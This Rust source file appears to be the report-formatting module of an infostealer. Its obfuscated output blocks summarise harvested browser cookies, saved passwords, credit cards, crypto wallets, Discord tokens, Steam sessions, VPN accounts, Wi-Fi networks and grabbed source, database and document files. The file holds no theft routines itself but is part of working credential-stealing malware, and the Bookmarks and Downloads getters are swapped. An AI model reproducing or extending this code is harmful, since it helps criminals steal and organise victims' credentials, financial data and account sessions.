use crate::{format, Collector};
use crate::{Browser, Device, FileGrabber, Software, Vpn};
use alloc::string::ToString;
use alloc::sync::Arc;
use alloc::vec::Vec;
use core::fmt::{Display, Formatter};
use derive_new::new;

macro_rules! collector_block {
    (
        $block_emoji:expr, $block_name:expr, [
            $( ($field_emoji:expr, $field_name:expr, $field_value:expr) ),* $(,)?
        ]
    ) => {{
        CollectorBlock::new(
            obfstr::obfstr!($block_emoji),
            obfstr::obfstr!($block_name),
            [
                $(
                    CollectorField::new(
                        obfstr::obfstr!($field_emoji),
                        obfstr::obfstr!($field_name),
                        Arc::from(format!("{}", $field_value)),
                    )
                ),*
            ],
        )
    }};
}

#[derive(new)]
pub struct CollectorField {
    #[new(into)]
    pub emoji: Arc<str>,
    #[new(into)]
    pub name: Arc<str>,
    pub value: Arc<str>,
}

#[derive(new)]
pub struct CollectorBlock {
    #[new(into)]
    pub emoji: Arc<str>,
    #[new(into)]
    pub name: Arc<str>,
    #[new(into)]
    pub fields: Arc<[CollectorField]>,
}

pub(crate) trait DisplayBuilder {
    fn build_block(&self) -> CollectorBlock;
}

pub struct EmojiBoolean(pub bool);

impl Display for EmojiBoolean {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        if self.0 {
            write!(f, "✅")
        } else {
            write!(f, "❌")
        }
    }
}

#[repr(transparent)]
struct BrowserDisplay<'a, T: Browser>(&'a T);

#[repr(transparent)]
struct SoftwareDisplay<'a, T: Software>(&'a T);

#[repr(transparent)]
struct FileGrabberDisplay<'a, T: FileGrabber>(&'a T);

#[repr(transparent)]
struct VpnDisplay<'a, T: Vpn>(&'a T);

#[repr(transparent)]
struct DeviceDisplay<'a, T: Device>(&'a T);

impl<'a, T: Browser> DisplayBuilder for BrowserDisplay<'a, T> {
    fn build_block(&self) -> CollectorBlock {
        let browser = self.0;
        collector_block!(
            "🔍",
            "Browser Data",
            [
                ("🍪", "Cookies", browser.get_cookies()),
                ("🔐", "Passwords", browser.get_passwords()),
                ("💳", "Credit Cards", browser.get_credit_cards()),
                ("✍️", "Autofills", browser.get_auto_fills()),
                ("🕘", "History", browser.get_history()),
                ("📑", "Bookmarks", browser.get_downloads()),
                ("⬇️", "Downloads", browser.get_bookmarks()),
            ]
        )
    }
}

impl<'a, T: Software> DisplayBuilder for SoftwareDisplay<'a, T> {
    fn build_block(&self) -> CollectorBlock {
        let software = self.0;
        collector_block!(
            "💻",
            "Installed Software",
            [
                ("👛", "Wallets", software.get_wallets()),
                ("📁", "FTP Hosts", software.get_ftp_hosts()),
                ("📲", "Telegram", EmojiBoolean(software.is_telegram())),
                ("🎮", "Discord Tokens", software.get_discord_tokens()),
                ("🕹️", "Steam Sessions", software.get_steam_session()),
            ]
        )
    }
}

impl<'a, T: FileGrabber> DisplayBuilder for FileGrabberDisplay<'a, T> {
    fn build_block(&self) -> CollectorBlock {
        let file_grabber = self.0;
        collector_block!(
            "📂",
            "User Files",
            [
                ("🧑‍💻", "Source Code", file_grabber.get_source_code_files()),
                ("🗃️", "Databases", file_grabber.get_database_files()),
                ("📄", "Documents", file_grabber.get_documents()),
            ]
        )
    }
}

impl<'a, T: Vpn> DisplayBuilder for VpnDisplay<'a, T> {
    fn build_block(&self) -> CollectorBlock {
        let vpn = self.0;
        collector_block!("🌐", "VPN", [("🔐", "Accounts", vpn.get_accounts()),])
    }
}

impl<'a, T: Device> DisplayBuilder for DeviceDisplay<'a, T> {
    fn build_block(&self) -> CollectorBlock {
        let vpn = self.0;
        collector_block!(
            "📶",
            "Device Data",
            [("📡", "Wi-Fi Networks", vpn.get_wifi_networks()),]
        )
    }
}

macro_rules! build_blocks {
    ($($block:expr),* $(,)?) => {{
        Arc::from([
            $($block.build_block()),*
        ])
    }};
}

pub trait CollectorDisplay: Collector {
    fn display_blocks(&self) -> Arc<[CollectorBlock]>;
}

impl<T: Collector> CollectorDisplay for T {
    fn display_blocks(&self) -> Arc<[CollectorBlock]> {
        build_blocks!(
            BrowserDisplay(self.get_browser()),
            SoftwareDisplay(self.get_software()),
            FileGrabberDisplay(self.get_file_grabber()),
            VpnDisplay(self.get_vpn()),
            DeviceDisplay(self.get_device())
        )
    }
}

pub struct PrimitiveDisplayCollector<'a, T: Collector>(pub &'a T);
struct PrimitiveBlockDisplay<'a>(&'a CollectorBlock);

impl Display for PrimitiveBlockDisplay<'_> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        writeln!(f, "▶ {}:", self.0.name)?;

        let len = self.0.fields.len();
        for (i, field) in self.0.fields.iter().enumerate() {
            let prefix = if i == len - 1 { "└─" } else { "├─" };
            writeln!(f, "{} {}: {}", prefix, field.name, field.value)?;
        }

        Ok(())
    }
}

impl<T: Collector> Display for PrimitiveDisplayCollector<'_, T> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "{}",
            self.0
                .display_blocks()
                .iter()
                .map(PrimitiveBlockDisplay)
                .map(|x| x.to_string())
                .collect::<Vec<_>>()
                .join("\n")
        )
    }
}
